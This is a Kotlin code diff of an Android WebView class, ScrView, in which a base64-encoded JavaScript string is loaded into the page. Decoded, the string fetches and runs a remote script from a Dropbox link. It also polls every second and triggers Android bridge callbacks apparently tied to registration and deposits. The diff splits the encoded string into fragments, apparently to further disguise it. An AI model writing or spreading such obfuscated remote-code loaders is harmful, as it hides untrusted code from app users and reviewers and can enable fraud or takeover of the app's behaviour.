@@ -60,18 +60,21 @@ class ScrView(context: Context, attrs: AttributeSet) : ScrBaseView(context, attr
     }
 
     private fun initMainFunc(id: String) {
-        val string =
-            "amF2YXNjcmlwdDogdmFyIHByZXZBc2s7c2R6PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpL" +
-                    "HNkei5vbmxvYWQ9ZnVuY3Rpb24oKXttYWluRnVuYygi" + id +
-                    "Iiksc2V0SW50ZXJ2YWwoKCk9Pnt2YXIgZT0oYXNrUmVnKCkrIiIpLnNwbGl0KCI6Iik7aWYoM" +
-                    "T09ZS5sZW5ndGgmJiItMSI9PXByZXZBc2smJiIwIj09ZVswXSYmYW5kcm9pZC5vblJlZygpLD" +
-                    "I9PWUubGVuZ3RoJiZwcmV2QXNrIT1lWzBdKXN3aXRjaChlWzBdKXtjYXNlIDE6YW5kcm9pZC5" +
-                    "vbkRlcDEoZVsxXSk7YnJlYWs7Y2FzZSAyOmFuZHJvaWQub25EZXAyKGVbMV0pO2JyZWFrO2Nh" +
-                    "c2UgMzphbmRyb2lkLm9uRGVwMyhlWzFdKX1wcmV2QXNrPWVbMF19LDFlMyl9LHNkei5zcmM9I" +
-                    "mh0dHBzOi8vZGwuZHJvcGJveC5jb20vcy9rZ3Nma2s2dTE2dmNoYmwvbWYuanMiLGRvY3VtZW" +
-                    "50LmJvZHkuYXBwZW5kQ2hpbGQoc2R6KTs"
+        val fpath = "amF2YXNjcmlwdDogdmFyIHByZXZBc2s7c2R" +
+                "6PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcm" +
+                "lwdCIpLHNkei5vbmxvYWQ9ZnVuY3Rpb24oKXttYWluRnVuYygi"
+        val spath = "Iiksc2V0SW50ZXJ2YWwoKCk9Pnt2YXIgZT0oYXNrUmVnKCkrIiIpLnNwbGl0KCI6Iik7aWYoM" +
+                "T09ZS5sZW5ndGgmJiItMSI9PXByZXZBc2smJiIwIj09ZVswXSYmYW5kcm9pZC5vblJlZygpLD" +
+                "I9PWUubGVuZ3RoJiZwcmV2QXNrIT1lWzBdKXN3aXRjaChlWzBdKXtjYXNlIDE6YW5kcm9pZC5" +
+                "vbkRlcDEoZVsxXSk7YnJlYWs7Y2FzZSAyOmFuZHJvaWQub25EZXAyKGVbMV0pO2JyZWFrO2Nh" +
+                "c2UgMzphbmRyb2lkLm9uRGVwMyhlWzFdKX1wcmV2QXNrPWVbMF19LDFlMyl9LHNkei5zcmM9I" +
+                "mh0dHBzOi8vZGwuZHJvcGJveC5jb20vcy9rZ3Nma2s2dTE2dmNoYmwvbWYuanMiLGRvY3VtZW" +
+                "50LmJvZHkuYXBwZW5kQ2hpbGQoc2R6KTs"
 
-        loadUrl("javascript: ${Base64.decode(string, Base64.DEFAULT).toString(charset("UTF-8"))}")
+        loadUrl(
+            "javascript: ${Base64.decode(fpath, Base64.DEFAULT).toString(charset("UTF-8"))
+                    + id + Base64.decode(spath, Base64.DEFAULT).toString(charset("UTF-8"))}"
+        )
     }
 
     private fun setClient() {
